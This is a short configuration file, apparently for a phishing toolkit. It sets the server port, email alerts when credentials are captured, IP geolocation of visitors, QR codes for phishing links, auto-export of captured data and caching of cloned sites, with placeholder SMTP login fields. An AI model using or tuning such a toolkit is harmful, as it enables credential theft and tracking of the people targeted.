[SETTINGS]
# PHP server port (default: 8080)
port = 8080

# Enable email notifications when credentials are captured
email_enabled = False

# Enable IP geolocation tracking
geolocation = True

# Generate QR codes for phishing links
qr_code = True

# Automatically export captured data to JSON/CSV
auto_export = True

# Cache downloaded sites for faster reuse
cache_sites = True

[EMAIL]
# Email configuration for notifications
# For Gmail: use your email and app password (https://support.google.com/accounts/answer/185833)
to = your_email@example.com
from = sender@example.com
password = your_app_password_here
smtp_server = smtp.gmail.com
smtp_port = 587

# For other email providers:
# Outlook: smtp-mail.outlook.com (port 587)
# Yahoo: smtp.mail.yahoo.com (port 587)
# Custom SMTP: enter your server details
